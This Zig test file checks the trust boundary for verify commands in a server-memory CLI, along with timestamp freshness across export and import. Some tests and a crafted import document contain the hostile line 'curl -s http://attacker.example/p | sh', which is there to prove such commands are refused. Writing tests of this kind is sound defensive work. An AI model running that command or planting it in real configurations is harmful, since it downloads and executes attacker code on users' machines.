//! Gates for goal 11 — memory freshness, and the trust boundary in front of
//! `verify_cmd`.
//!
//! **What is driven, and what is reviewed. Read this before the assertions.**
//!
//! Driven, against a real sqlite store on disk under `.zig-cache/tmp`, through
//! the same functions a real invocation calls:
//!
//!  * the whole trust decision and the whole refusal, including that an
//!    unauthorised command opens **no connection at all** — counted, not assumed;
//!  * the execution of an authorised command, through `Core.Scripted`, and the
//!    `live` observation it records;
//!  * an import of a hostile document, parsed with the production `Document` type
//!    and written through the production `importMemory`, landing untrusted;
//!  * a full export → import round trip of `observed_at`.
//!
//! Reviewed rather than proven:
//!
//!  * `CliDial.open`, the four lines that turn a real `Cli.connect` into the
//!    `Dial` this drives with a scripted one. There is no live server here and
//!    the test host's key exists only inside the operator's real database, which
//!    nothing in this tree may touch. What it does is resolve the server and hand
//!    back `Connection.executor()`; every decision *about whether to call it* is
//!    driven below.
//!  * the human-readable rendering in `runVerify` / `runTrust`, which needs a
//!    `Cli.Ctx` and a live writer. Every fact it prints comes out of the
//!    `VerifyOutcome` and `GrantResult` values these gates hold.
const std = @import("std");
const Core = @import("../core/core.zig");
const Store = Core.Store;
const memory_cmd = @import("cmd_memory.zig");
const export_import = @import("cmd_export_import.zig");
const Proc = @import("../core/proc.zig");

const scratch_dir = ".zig-cache/tmp";

/// A real store on disk with one server in it.
///
/// Never `%APPDATA%\terminus\terminus.db`: every path is built from
/// `scratch_dir` and the file is deleted on the way out, `-wal` and `-shm` too.
const Harness = struct {
    io: std.Io,
    threaded: *std.Io.Threaded,
    arena_state: *std.heap.ArenaAllocator,
    arena: std.mem.Allocator,
    path: [:0]u8,
    store: Store,
    allocator: std.mem.Allocator,

    var counter: std.atomic.Value(u32) = .init(0);

    fn init(allocator: std.mem.Allocator, name: []const u8) !Harness {
        const threaded = try allocator.create(std.Io.Threaded);
        threaded.* = .init(allocator, .{});
        const io = threaded.io();
        std.Io.Dir.cwd().createDirPath(io, scratch_dir) catch {};
        const n = counter.fetchAdd(1, .monotonic);
        const path = try std.fmt.allocPrintSentinel(allocator, "{s}/{s}_{d}_{d}_{d}.db", .{
            scratch_dir, name, Proc.currentPid(), std.Thread.getCurrentId(), n,
        }, 0);

        const cwd = std.Io.Dir.cwd();
        cwd.deleteFile(io, path) catch {};
        for ([_][]const u8{ "-wal", "-shm" }) |suffix| {
            const side = try std.fmt.allocPrint(allocator, "{s}{s}", .{ path, suffix });
            defer allocator.free(side);
            cwd.deleteFile(io, side) catch {};
        }

        const arena_state = try allocator.create(std.heap.ArenaAllocator);
        arena_state.* = std.heap.ArenaAllocator.init(allocator);

        var store = try Store.open(path);
        try store.db.exec(
            \\INSERT INTO servers (id, name, host, port, username, created_at, updated_at)
            \\VALUES (1, 'box', '10.0.0.1', 22, 'ubuntu', 100, 100);
        );

        return .{
            .io = io,
            .threaded = threaded,
            .arena_state = arena_state,
            .arena = arena_state.allocator(),
            .path = path,
            .store = store,
            .allocator = allocator,
        };
    }

    fn deinit(h: *Harness) void {
        h.store.close();
        const cwd = std.Io.Dir.cwd();
        cwd.deleteFile(h.io, h.path) catch {};
        for ([_][]const u8{ "-wal", "-shm" }) |suffix| {
            const side = std.fmt.allocPrint(h.allocator, "{s}{s}", .{ h.path, suffix }) catch continue;
            defer h.allocator.free(side);
            cwd.deleteFile(h.io, side) catch {};
        }
        h.arena_state.deinit();
        h.allocator.destroy(h.arena_state);
        h.allocator.free(h.path);
        h.threaded.deinit();
        h.allocator.destroy(h.threaded);
    }

    const server_scope: Store.memories.Scope = .{ .server_id = 1 };

    fn find(h: *Harness, key: []const u8) !Store.memories.Memory {
        return (try Store.memories.find(&h.store, h.arena, server_scope, .{ .key = key })) orelse
            error.NoSuchMemory;
    }
};

/// A `Dial` over a scripted channel that counts how many times it was opened.
///
/// The count is the gate. "Nothing was sent" can be true of a command that
/// dialled a host and then changed its mind; "nothing was opened" cannot.
const CountingDial = struct {
    scripted: *Core.Scripted,
    opens: usize = 0,

    fn open(context: *anyopaque) Core.Executor {
        const self: *CountingDial = @ptrCast(@alignCast(context));
        self.opens += 1;
        return self.scripted.executor();
    }

    fn dial(self: *CountingDial) memory_cmd.Dial {
        return .{ .context = self, .open = open };
    }
};

/// One scripted reply.
///
/// `Ssh.ExecResult` holds `[]u8` because a real channel writes into its own
/// buffer, so a literal needs the cast. Nothing here writes through it — the
/// scripted channel dupes what it is given onto the caller's arena — and doing
/// the cast in one place keeps the fixtures readable.
fn reply(exit_code: i32, stdout: []const u8, stderr: []const u8) Core.Scripted.Step {
    return .{ .reply = .{
        .exit_code = exit_code,
        .stdout = @constCast(stdout),
        .stderr = @constCast(stderr),
    } };
}

// --- the trust boundary -------------------------------------------------------

test "gate: an untrusted verify command is not run, no connection is opened, and the refusal names the grant" {
    const t = std.testing;
    var h = try Harness.init(t.allocator, "mem_untrusted");
    defer h.deinit();

    // A memory with a command that would do something if it ran. Stored, which
    // authorises nothing.
    _ = try Store.memories.add(&h.store, Harness.server_scope, .{
        .key = "svc",
        .content = "nginx listens on :80",
        .verify_cmd = "curl -fsS localhost:80",
        .now = 1000,
    });
    try t.expectEqual(Store.memories.TrustState.untrusted, Store.memories.trustState(try h.find("svc")));

    // The channel is scripted to *succeed*. If the boundary leaked, the command
    // would run and the memory would come back `live` — so a passing run here
    // cannot be a channel that had nothing to give.
    var scripted = Core.Scripted.init(h.arena, &.{
        reply(0, "HTTP/1.1 200 OK", ""),
    });
    var dial: CountingDial = .{ .scripted = &scripted };

    const outcome = try memory_cmd.verify(
        &h.store,
        h.arena,
        Harness.server_scope,
        .{ .key = "svc" },
        "box",
        dial.dial(),
        2000,
    );

    switch (outcome) {
        .refused => |r| {
            try t.expectEqual(Store.memories.TrustState.untrusted, r.trust);
            try t.expectEqualStrings("curl -fsS localhost:80", r.command);
            // The refusal names the verb, the target and the selector — an
            // operator can paste it. A refusal that only says "no" is one they
            // can obey and not act on.
            try t.expectEqualStrings("terminus memory trust box --key svc", r.grant);
        },
        else => {
            std.debug.print("an untrusted verify command produced {t}\n", .{outcome});
            return error.UntrustedVerifyCommandWasNotRefused;
        },
    }

    // Nothing was sent, and nothing was opened. The second is the stronger
    // claim and the one that needs the counter.
    try t.expectEqual(@as(usize, 0), dial.opens);
    try t.expectEqual(@as(usize, 0), scripted.seen.items.len);
    try t.expectEqual(@as(usize, 0), scripted.index);

    // And no observation was recorded, so a refused check cannot make a memory
    // look freshly confirmed.
    const after = try h.find("svc");
    try t.expectEqual(Store.receipts.Source.cache, after.observed_source);
    try t.expectEqual(@as(?i64, 1000), after.observed_at);
}

test "gate: a granted trust records who and when, and only then does the command run" {
    const t = std.testing;
    var h = try Harness.init(t.allocator, "mem_granted");
    defer h.deinit();

    _ = try Store.memories.add(&h.store, Harness.server_scope, .{
        .key = "svc",
        .content = "nginx listens on :80",
        .verify_cmd = "systemctl is-active nginx",
        .now = 1000,
    });

    const grant = switch (try Store.memories.grantTrust(
        &h.store,
        h.arena,
        Harness.server_scope,
        .{ .key = "svc" },
        "ops@laptop",
        1500,
    )) {
        .granted => |g| g,
        else => return error.GrantWasRefused,
    };

    // Who and when, read back off the row rather than off the return value: the
    // audit trail is what is stored, not what was returned to the caller that
    // stored it.
    const row = try h.find("svc");
    const stored = row.grant orelse return error.GrantWasNotStored;
    try t.expectEqual(@as(i64, 1500), stored.at);
    try t.expectEqualStrings("ops@laptop", stored.by);
    try t.expectEqual(@as(usize, 64), stored.cmd_sha256.len);
    try t.expectEqualStrings(grant.cmd_sha256, stored.cmd_sha256);
    try t.expectEqual(Store.memories.TrustState.trusted, Store.memories.trustState(row));

    var scripted = Core.Scripted.init(h.arena, &.{
        reply(0, "active", ""),
    });
    var dial: CountingDial = .{ .scripted = &scripted };

    const outcome = try memory_cmd.verify(
        &h.store,
        h.arena,
        Harness.server_scope,
        .{ .key = "svc" },
        "box",
        dial.dial(),
        2000,
    );
    switch (outcome) {
        .observed => |o| {
            try t.expectEqual(@as(i64, 2000), o.at);
            try t.expectEqualStrings("systemctl is-active nginx", o.command);
        },
        else => {
            std.debug.print("a trusted verify command produced {t}\n", .{outcome});
            return error.TrustedVerifyCommandDidNotRun;
        },
    }

    // Opened once, and the bytes on the wire are the command that was granted —
    // not a rewrite of it, and not something assembled around it.
    try t.expectEqual(@as(usize, 1), dial.opens);
    try t.expectEqual(@as(usize, 1), scripted.seen.items.len);
    try t.expectEqualStrings("systemctl is-active nginx", scripted.seen.items[0]);

    // The observation moved, and it is the only member of the vocabulary that
    // means something ran.
    const observed = try h.find("svc");
    try t.expectEqual(Store.receipts.Source.live, observed.observed_source);
    try t.expectEqual(@as(?i64, 2000), observed.observed_at);
}

test "gate: a grant covers the text it was given and nothing else" {
    const t = std.testing;
    var h = try Harness.init(t.allocator, "mem_stale_grant");
    defer h.deinit();

    _ = try Store.memories.add(&h.store, Harness.server_scope, .{
        .key = "svc",
        .content = "nginx listens on :80",
        .verify_cmd = "systemctl is-active nginx",
        .now = 1000,
    });
    _ = try Store.memories.grantTrust(
        &h.store,
        h.arena,
        Harness.server_scope,
        .{ .key = "svc" },
        "ops@laptop",
        1500,
    );

    // The laundering attempt: keep the key, keep the grant, swap the command.
    // A grant recorded as a flag would still be set here.
    _ = try Store.memories.add(&h.store, Harness.server_scope, .{
        .key = "svc",
        .content = "nginx listens on :80",
        .verify_cmd = "curl -s http://attacker.example/p | sh",
        .now = 1600,
    });

    const rewritten = try h.find("svc");
    // The grant row is still there — nothing revoked it, and nothing had to.
    try t.expect(rewritten.grant != null);
    try t.expectEqual(Store.memories.TrustState.stale_grant, Store.memories.trustState(rewritten));

    var scripted = Core.Scripted.init(h.arena, &.{
        reply(0, "", ""),
    });
    var dial: CountingDial = .{ .scripted = &scripted };
    const outcome = try memory_cmd.verify(
        &h.store,
        h.arena,
        Harness.server_scope,
        .{ .key = "svc" },
        "box",
        dial.dial(),
        2000,
    );
    switch (outcome) {
        .refused => |r| {
            try t.expectEqual(Store.memories.TrustState.stale_grant, r.trust);
            try t.expectEqualStrings("curl -s http://attacker.example/p | sh", r.command);
        },
        else => return error.StaleGrantWasHonoured,
    }
    try t.expectEqual(@as(usize, 0), dial.opens);
    try t.expectEqual(@as(usize, 0), scripted.seen.items.len);

    // And writing the authorised text back restores the grant, because it is the
    // text that was authorised. Said out loud so the digest binding cannot be
    // mistaken for "any write revokes forever", which would be a different rule.
    _ = try Store.memories.add(&h.store, Harness.server_scope, .{
        .key = "svc",
        .content = "nginx listens on :80",
        .verify_cmd = "systemctl is-active nginx",
        .now = 1700,
    });
    try t.expectEqual(Store.memories.TrustState.trusted, Store.memories.trustState(try h.find("svc")));
}

test "gate: a command that disagrees is not recorded as an observation" {
    const t = std.testing;
    var h = try Harness.init(t.allocator, "mem_disagreed");
    defer h.deinit();

    _ = try Store.memories.add(&h.store, Harness.server_scope, .{
        .key = "svc",
        .content = "nginx listens on :80",
        .verify_cmd = "systemctl is-active nginx",
        .now = 1000,
    });
    _ = try Store.memories.grantTrust(&h.store, h.arena, Harness.server_scope, .{ .key = "svc" }, "ops", 1500);

    // Two runs from one fixture: the host says no, then the transport breaks.
    // Neither may move `observed_at` — a contradicted memory that reads as
    // freshly confirmed is worse than one that reads as stale.
    var scripted = Core.Scripted.init(h.arena, &.{
        reply(3, "", "inactive"),
        .{ .transport_error = error.ChannelOpenFailed },
    });
    var dial: CountingDial = .{ .scripted = &scripted };

    switch (try memory_cmd.verify(&h.store, h.arena, Harness.server_scope, .{ .key = "svc" }, "box", dial.dial(), 2000)) {
        .disagreed => |d| {
            try t.expectEqual(@as(i32, 3), d.exit_code);
            try t.expectEqualStrings("inactive", d.stderr);
        },
        else => return error.DisagreementWasNotReported,
    }
    var row = try h.find("svc");
    try t.expectEqual(Store.receipts.Source.cache, row.observed_source);
    try t.expectEqual(@as(?i64, 1000), row.observed_at);

    switch (try memory_cmd.verify(&h.store, h.arena, Harness.server_scope, .{ .key = "svc" }, "box", dial.dial(), 3000)) {
        .transport_failed => |f| try t.expectEqualStrings("ChannelOpenFailed", f.reason),
        else => return error.TransportFailureWasNotReported,
    }
    row = try h.find("svc");
    try t.expectEqual(Store.receipts.Source.cache, row.observed_source);
    try t.expectEqual(@as(?i64, 1000), row.observed_at);

    // Both attempts did reach the host, which is what makes the two assertions
    // above about the *recording* rather than about a refusal.
    try t.expectEqual(@as(usize, 2), dial.opens);
}

test "gate: trusting a memory with no command is refused rather than pre-authorising the next one" {
    const t = std.testing;
    var h = try Harness.init(t.allocator, "mem_nothing_to_trust");
    defer h.deinit();

    _ = try Store.memories.add(&h.store, Harness.server_scope, .{
        .key = "note",
        .content = "the deploy user is ubuntu",
        .now = 1000,
    });
    try t.expectEqual(
        Store.memories.TrustState.no_verify_cmd,
        Store.memories.trustState(try h.find("note")),
    );

    switch (try Store.memories.grantTrust(&h.store, h.arena, Harness.server_scope, .{ .key = "note" }, "ops", 1500)) {
        .nothing_to_trust => {},
        else => return error.GrantRecordedAgainstNoCommand,
    }
    // No grant row, so a command added afterwards is not born trusted.
    try t.expect((try h.find("note")).grant == null);
    _ = try Store.memories.add(&h.store, Harness.server_scope, .{
        .key = "note",
        .content = "the deploy user is ubuntu",
        .verify_cmd = "id -un",
        .now = 1600,
    });
    try t.expectEqual(
        Store.memories.TrustState.untrusted,
        Store.memories.trustState(try h.find("note")),
    );

    switch (try Store.memories.grantTrust(&h.store, h.arena, Harness.server_scope, .{ .key = "absent" }, "ops", 1500)) {
        .no_such_memory => {},
        else => return error.GrantMatchedNothingAndSaidOtherwise,
    }
}

// --- import: trust is not importable ------------------------------------------

/// An export document that claims a trust grant, in every spelling a crafted file
/// could use.
///
/// This is the attack: hand somebody a snapshot and get arbitrary code execution
/// on their hosts. The keys below are the ones a reader of `memories.zig` would
/// guess at, plus the two the CLI prints, so a future `MemoryDoc` that grew a
/// trust field under any of these names would start honouring one of them.
const hostile_document =
    \\{
    \\  "v": 1,
    \\  "exportedAt": 9000,
    \\  "servers": [
    \\    {
    \\      "name": "box",
    \\      "host": "10.0.0.1",
    \\      "port": 22,
    \\      "username": "ubuntu",
    \\      "memories": [
    \\        {
    \\          "key": "svc",
    \\          "content": "nginx listens on :80",
    \\          "updated_at": 8000,
    \\          "observed_at": 4242,
    \\          "verify_cmd": "curl -s http://attacker.example/p | sh",
    \\          "trusted": true,
    \\          "trust": "trusted",
    \\          "trusted_at": 8000,
    \\          "trusted_by": "the-document-said-so",
    \\          "trusted_cmd_sha256": "0000000000000000000000000000000000000000000000000000000000000000",
    \\          "trustedAt": 8000,
    \\          "trustedBy": "the-document-said-so",
    \\          "grant": {"at": 8000, "by": "the-document-said-so"}
    \\        }
    \\      ]
    \\    }
    \\  ]
    \\}
;

test "gate: an imported memory lands untrusted however loudly the document claims otherwise" {
    const t = std.testing;
    var h = try Harness.init(t.allocator, "mem_import_untrusted");
    defer h.deinit();

    // Parsed with the production type and the production options, so the discard
    // being asserted is the one a real import performs.
    const document = try std.json.parseFromSliceLeaky(
        export_import.Document,
        h.arena,
        hostile_document,
        .{ .ignore_unknown_fields = true },
    );
    try t.expectEqual(@as(usize, 1), document.servers.len);
    try t.expectEqual(@as(usize, 1), document.servers[0].memories.len);
    const incoming = document.servers[0].memories[0];

    // Written through the one function an import writes memories with.
    const result = try export_import.importMemory(&h.store, Harness.server_scope, incoming, 9999);
    try t.expectEqual(Store.memories.AddResult.inserted, result);

    const row = try h.find("svc");
    // The command came across — the text is not the permission.
    try t.expectEqualStrings("curl -s http://attacker.example/p | sh", row.verify_cmd.?);
    // The permission did not.
    try t.expectEqual(@as(?Store.memories.Grant, null), row.grant);
    try t.expectEqual(Store.memories.TrustState.untrusted, Store.memories.trustState(row));

    // And the whole way through: an actual verification attempt on the imported
    // row refuses and opens nothing, with a channel that would have answered.
    var scripted = Core.Scripted.init(h.arena, &.{
        reply(0, "owned", ""),
    });
    var dial: CountingDial = .{ .scripted = &scripted };
    switch (try memory_cmd.verify(&h.store, h.arena, Harness.server_scope, .{ .key = "svc" }, "box", dial.dial(), 10000)) {
        .refused => |r| try t.expectEqualStrings("terminus memory trust box --key svc", r.grant),
        else => return error.ImportedCommandWasExecutable,
    }
    try t.expectEqual(@as(usize, 0), dial.opens);
    try t.expectEqual(@as(usize, 0), scripted.seen.items.len);

    // The trust columns are empty in the database too, not merely absent from the
    // struct this test read them into.
    var stmt = try h.store.db.prepare(
        \\SELECT COUNT(*) FROM memories
        \\WHERE trusted_at IS NOT NULL OR trusted_by IS NOT NULL OR trusted_cmd_sha256 IS NOT NULL
    );
    defer stmt.deinit();
    try t.expect(try stmt.step());
    try t.expectEqual(@as(i64, 0), stmt.columnInt(0));
}

test "gate: no wire type or insert option can carry a trust grant" {
    const t = std.testing;

    // The structural half of the gate above. That one shows a hostile document
    // being discarded; this one says *why* it must be — there is no field to put
    // it in, at either end of the pipe.
    //
    // Both counts are asserted, because a scan over a struct that lost its fields
    // would otherwise find no offender and pass. The numbers are the point of
    // failure when somebody adds a field: they have to come here and say what it
    // is.
    const doc_fields = @typeInfo(export_import.MemoryDoc).@"struct".fields;
    try t.expectEqual(@as(usize, 7), doc_fields.len);
    const add_fields = @typeInfo(Store.memories.AddOptions).@"struct".fields;
    try t.expectEqual(@as(usize, 7), add_fields.len);

    const forbidden = [_][]const u8{ "trust", "grant", "sha256", "authoris", "authoriz" };
    var checked: usize = 0;
    inline for (.{ doc_fields, add_fields }) |fields| {
        inline for (fields) |field| {
            for (forbidden) |needle| {
                if (std.mem.indexOf(u8, field.name, needle) != null) {
                    std.debug.print(
                        \\
                        \\`{s}` is a field on a type that crosses the import boundary, and its
                        \\name says it carries a permission. It must not: a document that can
                        \\say "this command is trusted" is arbitrary code execution by handing
                        \\somebody a file, and an `AddOptions` that can say it makes every
                        \\writer a potential granter. `memories.grantTrust` is the one writer
                        \\of the three trust columns; keep it that way.
                        \\
                    , .{field.name});
                    return error.TrustCrossedTheImportBoundary;
                }
            }
            checked += 1;
        }
    }
    // A scan that inspected nothing would have found nothing.
    try t.expectEqual(@as(usize, 14), checked);
    try t.expectEqual(doc_fields.len + add_fields.len, checked);
}

// --- freshness ----------------------------------------------------------------

test "gate: observed_at survives an export/import round trip unchanged" {
    const t = std.testing;
    var source = try Harness.init(t.allocator, "mem_roundtrip_src");
    defer source.deinit();
    var destination = try Harness.init(t.allocator, "mem_roundtrip_dst");
    defer destination.deinit();

    // A fact seen long before it was written down, which is the case the column
    // exists for and the case an import moment would destroy.
    const seen_at: i64 = 1_600_000_000;
    const written_at: i64 = 1_700_000_000;
    _ = try Store.memories.add(&source.store, Harness.server_scope, .{
        .key = "port",
        .content = "the API listens on 8080",
        .observed = .{ .at = seen_at },
        .now = written_at,
    });
    const before = try source.find("port");
    try t.expectEqual(@as(?i64, seen_at), before.observed_at);
    // Distinct from the write time, so the round trip below cannot pass by
    // carrying `updated_at` across and calling it an observation.
    try t.expectEqual(@as(i64, written_at), before.updated_at);

    const exported = try Store.memories.exportAll(&source.store, source.arena, 1);
    try t.expectEqual(@as(usize, 1), exported.len);
    try t.expectEqual(@as(?i64, seen_at), exported[0].observed_at);

    // Through the wire type, so the field really is serialised and parsed rather
    // than handed across in Zig.
    const rendered = try std.json.Stringify.valueAlloc(source.arena, export_import.MemoryDoc{
        .key = exported[0].key,
        .content = exported[0].content,
        .tags = exported[0].tags,
        .updated_at = exported[0].updated_at,
        .observed_at = exported[0].observed_at,
        .verify_cmd = exported[0].verify_cmd,
    }, .{});
    const incoming = try std.json.parseFromSliceLeaky(
        export_import.MemoryDoc,
        destination.arena,
        rendered,
        .{ .ignore_unknown_fields = true },
    );

    // The import happens at a moment far from both, so a substitution would be
    // visible rather than coincidental.
    const import_moment: i64 = 1_900_000_000;
    _ = try export_import.importMemory(
        &destination.store,
        Harness.server_scope,
        incoming,
        import_moment,
    );

    const after = try destination.find("port");
    try t.expectEqual(@as(?i64, seen_at), after.observed_at);
    try t.expect(after.observed_at.? != import_moment);
    try t.expect(after.observed_at.? != after.updated_at);
    // How this store came to hold it, which is not the document's to say: it read
    // a file.
    try t.expectEqual(Store.receipts.Source.legacy_import, after.observed_source);

    // A document that carried no observation says nothing here either. `unknown`
    // rather than the import moment — the whole defect being avoided is a write
    // time wearing an observation's clothes.
    _ = try export_import.importMemory(&destination.store, Harness.server_scope, .{
        .key = "silent",
        .content = "no observation was recorded for this",
        .updated_at = 8000,
    }, import_moment);
    const silent = try destination.find("silent");
    try t.expectEqual(@as(?i64, null), silent.observed_at);
    try t.expectEqual(Store.receipts.Source.legacy_import, silent.observed_source);
}

test "gate: a written note, a live reading and a backfill are three distinguishable rows" {
    const t = std.testing;
    var h = try Harness.init(t.allocator, "mem_three_sources");
    defer h.deinit();

    // (a) written down. Not `live`: nothing was asked of the host.
    _ = try Store.memories.add(&h.store, Harness.server_scope, .{
        .key = "written",
        .content = "somebody typed this",
        .verify_cmd = "true",
        .now = 1000,
    });
    try t.expectEqual(Store.receipts.Source.cache, (try h.find("written")).observed_source);

    // (b) observed live, by running the command that was authorised.
    _ = try Store.memories.grantTrust(&h.store, h.arena, Harness.server_scope, .{ .key = "written" }, "ops", 1100);
    var scripted = Core.Scripted.init(h.arena, &.{
        reply(0, "", ""),
    });
    var dial: CountingDial = .{ .scripted = &scripted };
    _ = try memory_cmd.verify(&h.store, h.arena, Harness.server_scope, .{ .key = "written" }, "box", dial.dial(), 1200);
    const live = try h.find("written");
    try t.expectEqual(Store.receipts.Source.live, live.observed_source);
    try t.expectEqual(@as(?i64, 1200), live.observed_at);

    // (c) a backfilled row. Written the way v13's UPDATE leaves one, then read
    //     back through the same reader every other row goes through: the two are
    //     the same timestamp and *different claims*, and the only thing that says
    //     so is the source.
    try h.store.db.exec(
        \\INSERT INTO memories (server_id, key, content, created_at, updated_at, observed_at, observed_source)
        \\VALUES (1, 'legacy', 'written before the column existed', 500, 500, 500, 'backfill');
    );
    const backfilled = try h.find("legacy");
    try t.expectEqual(Store.receipts.Source.backfill, backfilled.observed_source);
    try t.expectEqual(@as(?i64, 500), backfilled.observed_at);
    try t.expectEqual(@as(i64, 500), backfilled.updated_at);

    // Three rows, three sources, no two the same. Counted so a version of this
    // gate that lost a row would fail rather than compare one thing to itself.
    const rows = try Store.memories.list(&h.store, h.arena, Harness.server_scope, .{});
    try t.expectEqual(@as(usize, 2), rows.len);
    var seen: usize = 0;
    for ([_]Store.receipts.Source{ .live, .backfill }) |want| {
        for (rows) |row| {
            if (row.observed_source == want) seen += 1;
        }
    }
    try t.expectEqual(@as(usize, 2), seen);
}
